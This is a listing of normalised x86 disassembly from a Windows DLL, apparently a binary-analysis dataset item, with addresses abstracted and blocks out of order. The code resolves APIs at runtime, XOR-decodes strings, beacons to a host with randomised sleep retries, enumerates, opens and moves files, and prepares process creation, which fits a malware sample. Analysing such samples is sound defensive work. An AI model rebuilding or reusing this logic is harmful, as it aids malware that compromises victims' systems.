sub_10001010
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push esi
mov esi [ esp + 0x8c ]
push 0x7f
lea eax [ esp + 0x9 ]
push 0x0
push eax
mov [ esp + 0x10 ] 0x0
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_100029c0
lea ecx [ esp + 0x4 ]
push ecx
push esi
call [ GetProcAddress@IAT ]
pop esi
test eax eax
je r-xdata
mov ecx [ esp + 0x80 ]
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x84
retn 0x4
call eax
sub_10001080
push ecx
push ebx
push esi
push edi
push 0x0
call [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
mov ebx [ GetWindowThreadProcessId@IAT ]
mov edi [ GetWindow@IAT ]
mov edi edi
push 0x2
push esi
call edi
mov esi eax
test esi esi
jne r-xdata
mov ecx [ esp + 0x14 ]
cmp [ esp + 0xc ] ecx
je r-xdata
lea eax [ esp + 0xc ]
push eax
push esi
mov [ esp + 0x14 ] 0x0
call ebx
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ecx
retn
sub_100010e0
push esi
mov esi [ esp + 0xc ]
cmp esi 0x11
je r-xdata
call sub_100012a0
cmp esi 0x2
jne r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
push ecx
push esi
push edx
push eax
call [ CallWindowProcA@IAT ]
pop esi
retn 0x10
sub_10001140
sub esp 0x214
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x210 ] eax
mov eax [ esp + 0x218 ]
mov edx rw-data
push ebp
mov ebp [ esp + 0x220 ]
sub edx eax
lea ebx [ ebx ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov edx rw-data
mov eax esi
sub edx esi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov edx rw-data
mov eax edi
sub edx edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov edx rw-data
mov eax ebp
sub edx ebp
pop ebp
lea ebx [ ebx ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov eax [ esp + 0x220 ]
mov edx rw-data
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
push 0x104
lea eax [ esp + 0x10d ]
push 0x0
push eax
mov [ esp + 0x114 ] cl
call sub_1000ebe0
push 0x104
lea ecx [ esp + 0x11 ]
push 0x0
push ecx
mov [ esp + 0x18 ] 0x0
call sub_1000ebe0
add esp 0x18
mov ecx r--data
lea edx [ esp + 0x108 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp ]
call sub_100029c0
lea edx [ esp ]
push edx
lea eax [ esp + 0x10c ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x210 ]
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x214
retn
call eax
push eax
call sub_10001080
add esp 0x4
test eax eax
je r-xdata
push 0x1
push sub_10001120
call [ SetConsoleCtrlHandler@IAT ]
push sub_100010e0
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
mov [ rw-data ] eax
xor eax eax
mov ecx [ esp + 0x210 ]
xor ecx esp
call sub_1000c176
add esp 0x214
retn
sub_100012a0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
push ebx
push esi
mov esi [ GetFileAttributesA@IAT ]
push edi
push rw-data
call esi
cmp eax 0xffffffff
je r-xdata
push 0x6
mov edx rw-data
mov ecx rw-data
call sub_100031b0
add esp 0x4
push rw-data
mov ebx rw-data
mov esi rw-data
call sub_10002dd0
push rw-data
call esi
cmp eax 0xffffffff
jne r-xdata
push rw-data
mov ecx rw-data
call sub_100041c0
mov ecx [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
mov esp ebp
pop ebp
retn
push 0x3
mov edx rw-data
mov ecx rw-data
call sub_100031b0
add esp 0x4
mov ecx r--data
lea edx [ esp + 0xc ]
call sub_100029c0
lea edi [ esp + 0xc ]
dec edi
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
push rw-data
lea edx [ esp + 0x10 ]
mov ecx rw-data
mov [ edi ] ax
call sub_10002ef0
jmp r-xdata
add esp 0x4
sub_10001380
sub esp 0x220
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x218 ] eax
push esi
lea eax [ esp + 0x8 ]
push eax
push 0x101
call WSAStartup
test eax eax
jne r-xdata
mov ecx [ esp + 0x21c ]
pop esi
xor ecx esp
call sub_1000c176
add esp 0x220
retn
mov ecx r--data
lea edx [ esp + 0x198 ]
call sub_100029c0
lea ecx [ esp + 0x198 ]
push ecx
call gethostbyname
test eax eax
jne r-xdata
call WSACleanup
mov esi [ Sleep@IAT ]
call sub_1000ca3f
cdq
mov ecx 0x5
idiv ecx
add edx ecx
imul edx edx 0x2710
push edx
call esi
lea edx [ esp + 0x198 ]
push edx
call gethostbyname
test eax eax
je r-xdata
sub_10001420
sub esp 0x218
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x214 ] eax
push 0x104
lea eax [ esp + 0x111 ]
push 0x0
push eax
mov [ esp + 0xc ] 0x0
mov [ esp + 0x118 ] 0x0
call sub_1000ebe0
push 0x104
lea ecx [ esp + 0x15 ]
push 0x0
push ecx
mov [ esp + 0x1c ] 0x0
call sub_1000ebe0
mov eax [ esp + 0x238 ]
add esp 0x18
sub eax 0x1
jne r-xdata
mov ecx [ esp + 0x214 ]
xor ecx esp
mov eax 0x1
call sub_1000c176
add esp 0x218
retn 0xc
mov ecx r--data
lea edx [ esp + 0x10c ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x4 ]
call sub_100029c0
lea edx [ esp + 0x4 ]
push edx
lea eax [ esp + 0x110 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
lea ecx [ esp ]
push ecx
push 0x0
push 0x0
push sub_10001000
push 0x0
push 0x0
call eax
sub_100014f0
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x142c
call sub_1001a110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1428 ] eax
push ebx
push esi
push edi
push 0x103
lea eax [ esp + 0xc75 ]
push 0x0
push eax
mov [ esp + 0xc7c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea ecx [ esp + 0x645 ]
push 0x0
push ecx
mov [ esp + 0x64c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0x855 ]
push 0x0
push edx
mov [ esp + 0x85c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea eax [ esp + 0xa65 ]
push 0x0
push eax
mov [ esp + 0xa6c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea ecx [ esp + 0x74d ]
push 0x0
push ecx
mov [ esp + 0x754 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0xb6d ]
push 0x0
push edx
mov [ esp + 0xb74 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x3f
lea eax [ esp + 0x5c5 ]
push 0x0
push eax
mov [ esp + 0x5cc ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x3f
lea ecx [ esp + 0x605 ]
push 0x0
push ecx
mov [ esp + 0x60c ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0x95d ]
push 0x0
push edx
mov [ esp + 0x964 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x0
call sub_1000cd92
add esp 0x4
push eax
call sub_1000ca2d
add esp 0x4
push 0xf
push r--data
push rw-data
call sub_1000c4b0
add esp 0xc
push r--data
call [ GetModuleHandleA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov ecx r--data
lea edx [ esp + 0x748 ]
mov esi eax
call sub_100029c0
lea eax [ esp + 0x748 ]
push eax
push 0x0
push 0x0
call esi
mov esi eax
mov [ esp + 0xc ] esi
test esi esi
je r-xdata
push 0xbb8
call [ Sleep@IAT ]
xor ecx ecx
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
mov bl [ ecx + rw-data ]
test bl bl
je r-xdata
push esi
jmp r-xdata
mov [ esp + ecx + 0x10 ] bl
mov eax ecx
cdq
mov esi 0x1a
idiv esi
mov dl [ edx + r--data ]
cmp bl dl
je r-xdata
call [ CloseHandle@IAT ]
mov ecx [ esp + 0x1434 ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_1000c176
mov esp ebp
pop ebp
retn
movzx ecx [ esp + 0x196 ]
lea edx [ esp + 0xc70 ]
push edx
lea ebx [ esp + 0x644 ]
mov [ rw-data ] ecx
call sub_100043c0
add esp 0x4
push 0x100
lea eax [ esp + 0xb6c ]
push eax
push __dos_header
call [ GetModuleFileNameA@IAT ]
push 0x0
lea ecx [ esp + 0x74c ]
push ecx
push 0x0
lea edx [ esp + 0xb74 ]
push 0x0
push edx
call sub_1000cc53
add esp 0x14
xor eax eax
xor dl bl
mov [ esp + ecx + 0x10 ] dl
jmp r-xdata
mov cl [ esp + eax + 0x749 ]
mov [ esp + eax + 0x600 ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x600 ]
lea esi [ esp + 0x5c0 ]
call sub_10003180
mov ecx r--data
lea edx [ esp + 0x958 ]
call sub_100029c0
lea eax [ esp + 0x958 ]
push eax
mov ecx edi
push ecx
lea edx [ esp + 0xc78 ]
push edx
lea eax [ esp + 0xa6c ]
push r--data
push eax
call sub_1000c36c
add esp 0x14
mov ecx r--data
lea edx [ esp + 0x958 ]
call sub_100029c0
lea ecx [ esp + 0x958 ]
push ecx
mov edx esi
push edx
lea eax [ esp + 0x648 ]
push eax
lea ecx [ esp + 0x85c ]
push r--data
push ecx
call sub_1000c36c
add esp 0x14
lea edx [ esp + 0x198 ]
push edx
lea eax [ esp + 0xa64 ]
push eax
lea ecx [ esp + 0xb70 ]
push ecx
lea edi [ esp + 0x85c ]
lea esi [ esp + 0x64c ]
call sub_10001140
add esp 0xc
push 0x0
lea edx [ esp + 0x19c ]
mov ecx esi
call sub_100031b0
add esp 0x4
lea esp [ esp ]
inc ecx
cmp ecx 0x5a8
jl r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ esp + 0x850 ]
push eax
call edi
cmp eax 0xffffffff
jne r-xdata
lea eax [ esp + 0x850 ]
push eax
lea ebx [ esp + 0xa64 ]
lea esi [ esp + 0xb6c ]
call sub_10002dd0
mov [ rw-data ] eax
push 0x6
lea edx [ esp + 0x19c ]
lea ecx [ esp + 0x644 ]
call sub_100031b0
add esp 0x4
lea ecx [ esp + 0x198 ]
push ecx
lea ecx [ esp + 0x854 ]
call sub_100041c0
add esp 0x4
mov ecx r--data
lea edx [ esp + 0x958 ]
call sub_100029c0
lea edx [ esp + 0x640 ]
push edx
lea eax [ esp + 0x95c ]
push eax
lea ecx [ esp + 0x750 ]
push ecx
call sub_1000c36c
add esp 0xc
lea edx [ esp + 0x748 ]
push edx
call edi
cmp eax 0xffffffff
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x640 ]
push ecx
call [ SetCurrentDirectoryA@IAT ]
lea ecx [ esp + 0x1b8 ]
call sub_10002310
cmp [ esp + 0x5b4 ] 0x80
jne r-xdata
lea eax [ esp + 0x748 ]
push r--data
push eax
call sub_1000c759
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx r--data
lea edx [ esp + 0x5b8 ]
call sub_100029c0
lea edi [ esp + 0x5b8 ]
dec edi
push 0x3
lea edx [ esp + 0x19c ]
lea ecx [ esp + 0x644 ]
call sub_100031b0
add esp 0x4
lea edx [ esp + 0x5c0 ]
push edx
lea eax [ esp + 0x644 ]
push eax
lea ebx [ esp + 0x18 ]
call sub_10001ae0
mov eax [ rw-data ]
add esp 0x8
test eax eax
je r-xdata
call sub_10001380
push 0x5a8
lea ecx [ esp + 0xe85 ]
push 0x0
push ecx
mov [ esp + 0xe8c ] 0x0
call sub_1000ebe0
add esp 0xc
push esi
push 0x5a8
lea edx [ esp + 0xe88 ]
push 0x1
push edx
call sub_1000ca10
push esi
call sub_1000cd16
add esp 0x14
xor ecx ecx
lea ecx [ ecx ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
lea edx [ esp + 0x850 ]
mov [ edi ] cx
push edx
lea edx [ esp + 0x5bc ]
lea ecx [ esp + 0xa64 ]
call sub_10002ef0
mov edi [ GetFileAttributesA@IAT ]
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ esp + 0xc ]
push ecx
imul eax eax 0xea60
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov [ esp + ecx + 0x10 ] bl
mov eax ecx
cdq
mov esi 0x1a
idiv esi
mov dl [ edx + r--data ]
cmp bl dl
je r-xdata
add esp 0x4
mov edi [ GetFileAttributesA@IAT ]
lea edx [ esp + 0xa60 ]
push edx
call edi
cmp eax 0xffffffff
je r-xdata
mov bl [ esp + ecx + 0xe80 ]
test bl bl
je r-xdata
movzx eax [ esp + 0x196 ]
mov [ rw-data ] eax
xor eax eax
jmp r-xdata
xor dl bl
mov [ esp + ecx + 0x10 ] dl
jmp r-xdata
mov cl [ esp + eax + 0x748 ]
mov [ esp + eax + 0xd78 ] cl
inc eax
test cl cl
jne r-xdata
inc ecx
cmp ecx 0x5a8
jl r-xdata
lea edi [ esp + 0xd78 ]
dec edi
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
lea edx [ esp + 0xd78 ]
push edx
lea eax [ esp + 0x74c ]
push eax
mov [ edi ] cx
call [ MoveFileA@IAT ]
sub_10001ae0
sub esp 0x8
push ebp
push esi
push edi
xor edi edi
xor ebp ebp
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
je r-xdata
test ebp ebp
jl r-xdata
mov ecx [ rw-data ]
shl ecx 0x6
lea esi [ ecx + ebx + 0x60 ]
mov eax esi
lea ecx [ eax + 0x1 ]
mov [ esp + 0x10 ] ecx
lea ebx [ ebx ]
test edi edi
je r-xdata
test edi edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax [ esp + 0x10 ]
je r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
call sub_10004b80
xor edi edi
test ebp ebp
jle r-xdata
lea eax [ ebx + 0x510 ]
push eax
lea ecx [ ebx + 0x2b8 ]
push ecx
mov ecx [ rw-data ]
add ecx 0x9
shl ecx 0x5
lea eax [ ebx + 0x2b0 ]
push eax
add ecx ebx
push ecx
mov ecx [ esp + 0x2c ]
push esi
call sub_100044d0
mov edi eax
add esp 0x14
push edi
xor esi esi
call sub_10004be0
mov ebp eax
add esp 0x4
test ebp ebp
jge r-xdata
call sub_10006150
mov eax [ rw-data ]
shl eax 0x5
lea edx [ eax + ebx ]
mov eax edx
lea esi [ eax + 0x1 ]
mov eax 0x1
mov [ rw-data ] 0x0
cmp [ rw-data ] eax
jne r-xdata
call sub_10004b80
pop edi
pop esi
pop ebp
add esp 0x8
retn
cmp [ rw-data ] 0x0
mov esi [ esp + 0x18 ]
je r-xdata
push 0x1388
call [ Sleep@IAT ]
inc esi
cmp esi 0x2
jg r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebp
add esp 0x8
retn
mov [ rw-data ] 0x2
jmp r-xdata
push esi
push edi
mov ecx 0x3ea
call sub_10001c50
lea edx [ ebx + 0x188 ]
push esi
mov ecx edi
call sub_10001fe0
add esp 0xc
push esi
push edi
mov ecx 0x3e9
call sub_10001c50
add esp 0x8
mov [ rw-data ] 0x0
push edi
call sub_10004be0
mov ebp eax
add esp 0x4
test ebp ebp
jl r-xdata
jmp r-xdata
sub_10001c50
sub esp 0x314
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x30c ] eax
mov eax [ esp + 0x31c ]
push ebx
push ebp
mov ebp [ esp + 0x320 ]
push esi
push edi
xor ebx ebx
push 0xff
mov esi ecx
lea ecx [ esp + 0x11d ]
push ebx
push ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x124 ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea edx [ esp + 0x21d ]
push ebx
push edx
mov [ esp + 0x224 ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea eax [ esp + 0x1d ]
push ebx
push eax
mov [ esp + 0x24 ] bl
call sub_1000ebe0
add esp 0xc
mov ecx r--data
lea edx [ esp + 0x118 ]
mov [ esp + 0x10 ] ebx
call sub_100029c0
cmp esi 0x3ea
jne r-xdata
cmp esi 0x3e9
jne r-xdata
call sub_1000ca3f
cdq
mov ecx 0x64
idiv ecx
lea eax [ esp + 0x118 ]
lea ecx [ esp + 0x18 ]
add edx 0xa
push edx
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_1000c36c
add esp 0x10
mov ecx r--data
lea edx [ esp + 0x118 ]
call sub_100029c0
lea edi [ esp + 0x18 ]
dec edi
mov ecx [ esp + 0x31c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x314
retn
call sub_1000ca3f
cdq
mov ecx 0xa
idiv ecx
lea eax [ esp + 0x118 ]
lea ecx [ esp + 0x18 ]
push edx
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_1000c36c
add esp 0x10
mov ecx r--data
lea edx [ esp + 0x118 ]
call sub_100029c0
lea edi [ esp + 0x18 ]
dec edi
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov dx [ r--data ]
lea eax [ esp + 0x118 ]
mov [ edi ] dx
mov edx eax
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov dx [ r--data ]
lea eax [ esp + 0x118 ]
mov [ edi ] dx
mov edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x18 ]
sub eax edx
dec edi
lea edi [ esp + 0x18 ]
sub eax edx
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
dec edi
lea ecx [ ecx ]
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ ebp + 0x108 ]
mov ecx eax
lea esp [ esp ]
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ ebp + 0x108 ]
mov ecx eax
lea esp [ esp ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x18 ]
sub eax ecx
mov esi ecx
dec edi
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x18 ]
sub eax ecx
mov esi ecx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x14 ]
push edx
mov ecx ebp
call sub_10004da0
mov esi eax
add esp 0x8
cmp esi ebx
je r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx r--data
lea edx [ esp + 0x118 ]
call sub_100029c0
lea edi [ esp + 0x18 ]
dec edi
lea esp [ esp ]
push 0x3e8
call [ Sleep@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push ebp
push eax
push ecx
mov ecx esi
call sub_1000b2f3
add esp 0xc
push esi
call sub_1000c3e9
add esp 0x4
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x14 ]
push eax
mov ecx ebp
call sub_10004da0
mov esi eax
add esp 0x8
cmp esi ebx
jne r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov cx [ r--data ]
lea eax [ esp + 0x118 ]
mov [ edi ] cx
mov edx eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x18 ]
sub eax edx
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x18 ]
dec edi
lea ecx [ ecx ]
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov dx [ r--data ]
mov [ edi ] dx
lea eax [ ebp + 0x328 ]
lea edx [ esp + 0x218 ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x218 ]
call sub_10002600
mov eax edi
mov edx edi
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x18 ]
sub eax edx
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov esi edx
jmp r-xdata
sub_10001fe0
sub esp 0x560
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x55c ] eax
push ebx
push ebp
mov ebp [ esp + 0x56c ]
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ esp + 0x46d ]
mov edi ecx
push ebx
push eax
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] ebp
mov esi edx
mov [ esp + 0x474 ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea ecx [ esp + 0x16d ]
push ebx
push ecx
mov [ esp + 0x174 ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea edx [ esp + 0x36d ]
push ebx
push edx
mov [ esp + 0x374 ] bl
call sub_1000ebe0
add esp 0xc
push 0xff
lea eax [ esp + 0x26d ]
push ebx
push eax
mov [ esp + 0x274 ] bl
call sub_1000ebe0
xor eax eax
mov [ esp + 0x165 ] eax
mov [ esp + 0x169 ] eax
mov [ esp + 0x16d ] eax
mov [ esp + 0x171 ] ax
mov [ esp + 0x173 ] al
lea eax [ edi + 0x328 ]
lea ecx [ esp + 0x274 ]
add esp 0xc
mov [ esp + 0x158 ] bl
sub ecx eax
lea ecx [ ecx ]
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
cmp dl bl
jne r-xdata
lea edi [ esp + 0x268 ]
call sub_10002600
mov ecx edi
push ecx
lea edx [ esp + 0x36c ]
push edx
call sub_1000c36c
mov ecx r--data
lea edx [ esp + 0x160 ]
call sub_100029c0
lea eax [ esp + 0x160 ]
push eax
push esi
push ebp
lea ecx [ esp + 0x47c ]
push r--data
push ecx
call sub_1000c36c
add esp 0x1c
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ esp + 0x56c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x560
retn
mov ebp [ FindNextFileA@IAT ]
xor esi esi
lea esp [ esp ]
mov edx [ esp + 0x10 ]
lea eax [ esp + 0x168 ]
push eax
lea ecx [ esp + 0x36c ]
push ecx
push edx
call sub_10004f60
add esp 0xc
test eax eax
jge r-xdata
push ebx
push 0x80
push 0x4
push ebx
push ebx
push 0xc0000000
lea edx [ esp + 0x180 ]
push edx
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esp + 0x168 ]
push ecx
call sub_1000c477
add esp 0x4
push 0x3e8
call [ Sleep@IAT ]
inc esi
cmp esi 0x3
jl r-xdata
lea edx [ esp + 0x18 ]
push edx
push eax
call [ CloseHandle@IAT ]
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x44 ]
push ecx
push edx
lea eax [ esp + 0x170 ]
push r--data
push eax
call sub_1000c36c
add esp 0x10
lea ecx [ esp + 0x168 ]
push ecx
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
lea eax [ esp + 0x18 ]
push eax
jmp r-xdata
push edi
call [ FindClose@IAT ]
push edi
xor esi esi
call ebp
test eax eax
jne r-xdata
sub_10002230
sub esp 0x20c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x208 ] eax
push ebp
mov ebp [ esp + 0x218 ]
push esi
mov esi [ esp + 0x218 ]
push edi
push 0xff
lea eax [ esp + 0x115 ]
push 0x0
push eax
mov [ esp + 0x11c ] 0x0
call sub_1000ebe0
push 0xff
lea ecx [ esp + 0x21 ]
push 0x0
push ecx
mov [ esp + 0x28 ] 0x0
call sub_1000ebe0
add esp 0x18
test esi esi
jne r-xdata
lea eax [ esi + 0x328 ]
lea edx [ esp + 0x10 ]
sub edx eax
nop
or eax 0xffffffff
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x10 ]
call sub_10002600
mov edx edi
push edx
lea eax [ esp + 0x114 ]
push eax
call sub_1000c36c
mov ecx [ esp + 0x22c ]
push ecx
lea edx [ esp + 0x11c ]
push ebp
push edx
xor ecx ecx
mov edx esi
call sub_10005020
xor ecx ecx
add esp 0x14
test eax eax
setge cl
dec ecx
mov eax ecx
mov ecx [ esp + 0x214 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_1000c176
add esp 0x20c
retn 0xc
sub_10002310
sub esp 0x494
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48c ] eax
push ebx
push ebp
push esi
push edi
xor ebx ebx
push 0x103
lea eax [ esp + 0x7d ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x84 ] bl
call sub_1000ebe0
push 0x103
xor eax eax
lea ecx [ esp + 0x191 ]
push ebx
push ecx
mov [ esp + 0x88 ] bl
mov [ esp + 0x89 ] eax
mov [ esp + 0x8d ] ax
mov [ esp + 0x8f ] al
mov [ esp + 0x198 ] bl
call sub_1000ebe0
push 0x40
lea edx [ esp + 0x48 ]
push ebx
push edx
mov [ esp + 0x4c ] ebx
call sub_1000ebe0
push 0x104
lea eax [ esp + 0x3b9 ]
push ebx
push eax
mov [ esp + 0x3c0 ] bl
call sub_1000ebe0
push 0x104
lea ecx [ esp + 0x2bd ]
push ebx
push ecx
mov [ esp + 0x2c4 ] bl
call sub_1000ebe0
add esp 0x3c
mov ecx r--data
lea edx [ esp + 0x390 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x288 ]
call sub_100029c0
lea edx [ esp + 0x288 ]
push edx
lea eax [ esp + 0x394 ]
push eax
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x49c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x494
retn
lea edx [ esp + 0x180 ]
mov eax esi
sub edx esi
lea ebx [ ebx ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea ecx [ esp + 0x180 ]
push r--data
push ecx
call sub_1000c5d4
push r--data
push ebx
call sub_1000c5d4
add esp 0x10
cmp eax ebx
je r-xdata
mov ebp [ Sleep@IAT ]
mov esi [ GetFileAttributesA@IAT ]
mov edi [ CreateFileA@IAT ]
push r--data
push ebx
call sub_1000c5d4
add esp 0x8
cmp eax ebx
jne r-xdata
lea ecx [ esp + 0x78 ]
push ecx
call esi
cmp eax 0xffffffff
je r-xdata
push 0x104
lea edx [ esp + 0x7c ]
push edx
push eax
call [ ExpandEnvironmentStringsA@IAT ]
lea eax [ esp + 0x78 ]
push eax
call esi
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x78 ]
lea edx [ eax + 0x1 ]
push ebx
push 0x80
push 0x4
push ebx
push ebx
push 0xc0000000
lea edx [ esp + 0x90 ]
push edx
call edi
cmp eax 0xffffffff
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push eax
call [ CloseHandle@IAT ]
xor eax eax
lea eax [ esp + 0x78 ]
lea edx [ eax + 0x1 ]
lea edx [ esp + 0x70 ]
push r--data
push edx
call sub_1000c31a
add esp 0x8
test eax eax
jne r-xdata
push 0x44
lea edx [ esp + 0x2c ]
push ebx
push edx
call sub_1000ebe0
add esp 0xc
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push ebx
push ebx
push ebx
push ebx
xor eax eax
push ebx
push ebx
